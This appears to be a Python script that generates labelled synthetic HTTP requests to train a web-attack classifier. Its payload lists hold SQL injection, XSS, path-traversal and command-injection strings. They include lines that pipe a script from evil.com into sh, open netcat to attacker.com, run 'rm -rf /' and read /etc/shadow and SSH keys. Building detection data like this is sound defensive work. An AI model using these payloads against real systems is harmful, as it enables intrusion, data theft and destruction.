#!/usr/bin/env python3
"""합성 HTTP 요청 데이터 생성기 (보안 ML 학습용).

정상 요청과 공격 페이로드(SQLi/XSS/경로순회/명령주입)를 균형 분포로 합성해
data/requests.csv 로 출력한다. 멱등(매 실행 시 덮어씀), 재현성을 위해 시드 고정.

CSV 스키마: method,path,query,body,label
  - 원시 요청 구성요소만 저장한다. 텍스트 정규화(normalize_request)는
    app/ml/data.py 에서 학습/런타임이 공유하므로 여기서는 하지 않는다.

사용:
  python scripts/seed_attacks.py                # 기본 v1 (카테고리당 200건)
  python scripts/seed_attacks.py --per 300      # 카테고리당 건수 지정
  python scripts/seed_attacks.py --version v2   # 재학습용 변형/추가 페이로드 포함 (Step 10)
"""
import argparse
import csv
import os
import random

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
OUT_PATH = os.path.join(ROOT, "data", "requests.csv")
SEED = 42

# ── 정상 트래픽: 앱의 실제 경로 + 평범한 파라미터 ──────────────
BENIGN_PATHS = ["/", "/dashboard", "/logs", "/logs/create", "/subjects",
                "/search", "/login", "/register", "/export", "/health"]
BENIGN_QUERY_KEYS = ["q", "subject_id", "page", "sort", "limit"]
BENIGN_QUERY_VALS = ["python", "algorithms", "flask", "1", "2", "10",
                     "math", "english", "recent", "title", "asc", "desc", ""]
BENIGN_TITLES = ["Flask 라우팅 공부", "알고리즘 정렬 복습", "영어 단어 암기",
                 "운영체제 스케줄링", "네트워크 TCP/IP", "DB 인덱스 정리",
                 "선형대수 행렬", "도커 기초", "Git 브랜치 전략", "통계 회귀분석"]
BENIGN_CONTENTS = ["오늘 2시간 집중함", "예제 코드 따라 작성", "요약 노트 정리",
                   "퀴즈 풀이 80점", "강의 3개 수강", "복습 위주로 진행", ""]

# ── 공격 페이로드 (카테고리별) ────────────────────────────────
SQLI = [
    "' OR 1=1--", "' OR '1'='1", "admin'--", "' UNION SELECT username,password FROM users--",
    "1; DROP TABLE users--", "' OR SLEEP(5)--", "') OR ('1'='1", "1' AND 1=CONVERT(int,@@version)--",
    "'; EXEC xp_cmdshell('dir')--", "0 UNION SELECT NULL,NULL--", "' OR 'x'='x", "admin' #",
    "1 OR 1=1", "'; WAITFOR DELAY '0:0:5'--", "%27%20OR%201%3D1--",
]
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "javascript:alert(document.cookie)", "\"><script>alert('xss')</script>",
    "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<a href='javascript:alert(1)'>x</a>",
    "<input onfocus=alert(1) autofocus>", "%3Cscript%3Ealert(1)%3C/script%3E",
    "<img src=1 href=1 onerror=javascript:alert(1)>", "'-alert(1)-'", "<details open ontoggle=alert(1)>",
]
PATH_TRAVERSAL = [
    "../../etc/passwd", "../../../etc/shadow", "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd", "/var/www/../../etc/passwd", "..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "../../../../boot.ini", "file:///etc/passwd",
    "..%252f..%252fetc%252fpasswd", "/proc/self/environ", "../../.ssh/id_rsa",
]
CMDI = [
    "; cat /etc/passwd", "| whoami", "`id`", "$(rm -rf /)", "&& ping -c 4 127.0.0.1",
    "; ls -la /", "| nc attacker.com 4444", "; curl http://evil.com/shell.sh | sh",
    "$(cat /etc/shadow)", "& net user", "|| uname -a", "; wget http://evil.com/x",
    "%3B%20cat%20/etc/passwd", "`sleep 5`",
]

ATTACK_PAYLOADS = {
    "sqli": SQLI,
    "xss": XSS,
    "path_traversal": PATH_TRAVERSAL,
    "cmdi": CMDI,
}

# 공격이 실릴 법한 경로/파라미터 (앱 표면)
ATTACK_PATHS = ["/search", "/logs", "/logs/create", "/subjects", "/login", "/export"]
ATTACK_PARAM_KEYS = ["q", "title", "content", "username", "subject_id", "file", "id"]


def _v2_extra():
    """Step 10 재학습용: v2에서 추가되는 신규 공격 변형."""
    SQLI.extend(["' OR 1=1 LIMIT 1--", "1)) OR ((1=1", "'||(SELECT pass FROM users)||'"])
    CMDI.extend(["; python -c 'import os;os.system(\"id\")'", "$(printf 'id')", "; busybox wget evil"])
    XSS.append("<math><mtext><script>alert(1)</script>")
    PATH_TRAVERSAL.append("..%c0%af..%c0%afetc/passwd")


def gen_benign(rng):
    path = rng.choice(BENIGN_PATHS)
    method = rng.choice(["GET", "GET", "GET", "POST"])
    query, body = "", ""
    if method == "GET" and rng.random() < 0.8:
        k = rng.choice(BENIGN_QUERY_KEYS)
        v = rng.choice(BENIGN_QUERY_VALS)
        query = f"{k}={v}" if v != "" else k
    if method == "POST":
        body = f"title={rng.choice(BENIGN_TITLES)}&content={rng.choice(BENIGN_CONTENTS)}&hours={rng.randint(1,5)}"
    return method, path, query, body


def gen_attack(rng, label):
    payload = rng.choice(ATTACK_PAYLOADS[label])
    path = rng.choice(ATTACK_PATHS)
    key = rng.choice(ATTACK_PARAM_KEYS)
    method = rng.choice(["GET", "POST"])
    query, body = "", ""
    # 페이로드를 query 또는 body, 가끔은 path 자체(경로순회)에 삽입
    if label == "path_traversal" and rng.random() < 0.5:
        path = "/" + payload
    elif method == "GET":
        query = f"{key}={payload}"
    else:
        body = f"{key}={payload}"
    return method, path, query, body


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--per", type=int, default=200, help="카테고리당 생성 건수")
    ap.add_argument("--version", default="v1", help="데이터 버전 (v2면 추가 변형 포함)")
    ap.add_argument("--out", default=OUT_PATH)
    args = ap.parse_args()

    rng = random.Random(SEED if args.version == "v1" else SEED + 1)
    if args.version != "v1":
        _v2_extra()

    rows = []
    for _ in range(args.per):
        rows.append((*gen_benign(rng), "benign"))
    for label in ATTACK_PAYLOADS:
        for _ in range(args.per):
            rows.append((*gen_attack(rng, label), label))
    rng.shuffle(rows)

    os.makedirs(os.path.dirname(args.out), exist_ok=True)
    with open(args.out, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["method", "path", "query", "body", "label"])
        w.writerows(rows)

    # 분포 요약 출력
    from collections import Counter
    dist = Counter(r[-1] for r in rows)
    print(f"[seed_attacks] version={args.version} → {args.out}")
    print(f"[seed_attacks] total={len(rows)} rows")
    for label in (["benign"] + list(ATTACK_PAYLOADS)):
        print(f"  - {label:<15} {dist[label]}")


if __name__ == "__main__":
    main()
